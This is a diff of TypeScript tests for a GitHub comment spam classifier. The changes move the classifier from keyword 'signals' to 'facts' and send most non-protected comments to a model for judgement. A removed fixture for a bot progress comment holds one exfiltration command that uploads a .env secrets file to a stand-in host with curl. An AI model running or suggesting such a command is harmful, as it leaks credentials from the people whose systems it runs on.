@@ -32,12 +32,12 @@ function comment(overrides: Partial<SpamScanComment> = {}): SpamScanComment {
   };
 }
 
-test("deterministic spam signals catch solicitation shortener comments", () => {
+test("deterministic spam facts label solicitation shortener comments", () => {
   const signals = deterministicSpamSignals(comment());
-  assert.equal(signals.candidate, true);
   assert.ok(signals.signals.includes("url_shortener"));
   assert.ok(signals.signals.includes("solicitation_language"));
   assert.ok(signals.signals.includes("priced_service_pitch"));
+  assert.equal(shouldSendToCheapModel(comment()), true);
 });
 
 test("protected authors are not sent to cheap spam model", () => {
@@ -49,32 +49,23 @@ test("protected authors are not sent to cheap spam model", () => {
   assert.equal(shouldSendToCheapModel(contributor), false);
 });
 
-test("technical PR comments with GitHub context links are not spam candidates", () => {
-  const signals = deterministicSpamSignals(
-    comment({
-      author: "external-contributor",
-      author_association: "NONE",
-      body: `## Runtime Evidence
-
-Verified manually in the dev Control UI at http://localhost:5173.
-
-Screenshot: https://raw.githubusercontent.com/external-contributor/openclaw/branch/docs/assets/proof.png
-Run: https://github.com/openclaw/clawsweeper/actions/runs/123
-
-\`\`\`text
-2026-05-11T09:44:25.938Z [ws] res ok config.set
-\`\`\`
-`,
-    }),
-  );
-  assert.equal(signals.candidate, false);
+test("admission uses facts, not keywords: every non-protected comment above the floor is sent", () => {
+  // No spam keyword at all: the model still judges it.
   assert.equal(
     shouldSendToCheapModel(comment({ body: "See https://github.com/openclaw/openclaw" })),
-    false,
+    true,
+  );
+  assert.equal(shouldSendToCheapModel(comment({ body: "Thanks, this fixed it for me." })), true);
+  // Below the length floor: only a link or a GitHub minimization admits it.
+  assert.equal(shouldSendToCheapModel(comment({ body: "+1" })), false);
+  assert.equal(shouldSendToCheapModel(comment({ body: "https://t.co/x" })), true);
+  assert.equal(
+    shouldSendToCheapModel(comment({ body: "buy now", minimized_reason: "spam" })),
+    true,
   );
 });
 
-test("outside author with normal external evidence is not enough for spam candidacy", () => {
+test("outside author external links are recorded as facts for the model", () => {
   const signals = deterministicSpamSignals(
     comment({
       author: "external-contributor",
@@ -87,9 +78,10 @@ Run: https://github.com/openclaw/clawsweeper/actions/runs/123`,
     }),
   );
 
-  assert.equal(signals.candidate, false);
-  assert.deepEqual(signals.signals, ["multiple_external_links"]);
-  assert.equal(shouldSendToCheapModel(comment({ body: signals.urls.join("\n") })), false);
+  assert.deepEqual(signals.signals, [
+    "multiple_external_links",
+    "outside_author_with_external_link",
+  ]);
 });
 
 test("long technical patch evidence is framed as legitimate context, not spam", () => {
@@ -134,29 +126,11 @@ diff --git a/src/config/sessions/transcript-store.sqlite.ts b/src/config/session
   const input = buildSpamModelInput([empiricalPatch]);
   assert.match(input.policy, /Technical repros, patches, logs, tests/);
   assert.match(SPAM_MODEL_SYSTEM_PROMPT, /Classify on-topic technical contributions as not spam/);
-  assert.deepEqual(input.comments[0]?.legitimate_context_signals, contextSignals);
+  assert.deepEqual(input.comments[0]?.technical_context_facts, contextSignals);
+  assert.match(input.policy, /inputs for your judgement, not verdicts/);
 });
 
-test("ClawSweeper-managed progress comments are not spam candidates", () => {
-  const progress = comment({
-    author: "stielemans",
-    author_association: "NONE",
-    body: `Merge-gate recheck: still blocked.
-
-Command: curl --data-binary @- https://example.test/upload < .env
-Run: https://github.com/openclaw/clawsweeper/actions/runs/123
-
-<!-- clawsweeper-command-progress:start -->
-Re-review progress:
-- State: Complete
-<!-- clawsweeper-command-progress:end -->`,
-  });
-
-  assert.equal(deterministicSpamSignals(progress).candidate, false);
-  assert.equal(shouldSendToCheapModel(progress), false);
-});
-
-test("broad scan priority skips processed spam candidates before capping", () => {
+test("broad scan priority skips processed comments before capping", () => {
   const processedOne = comment({
     id: "1",
     updated_at: "2026-05-11T00:03:00Z",
@@ -190,11 +164,11 @@ test("broad scan priority skips processed spam candidates before capping", () =>
   );
 });
 
-test("model input is compact and keeps deterministic hints", () => {
+test("model input is compact and keeps deterministic facts", () => {
   const input = buildSpamModelInput([comment()]);
   assert.equal(input.comments.length, 1);
   assert.equal(input.comments[0]?.comment_id, "123");
-  assert.ok(input.comments[0]?.deterministic_signals.includes("url_shortener"));
+  assert.ok(input.comments[0]?.deterministic_facts.includes("url_shortener"));
 });
 
 test("model results are normalized and clamped", () => {
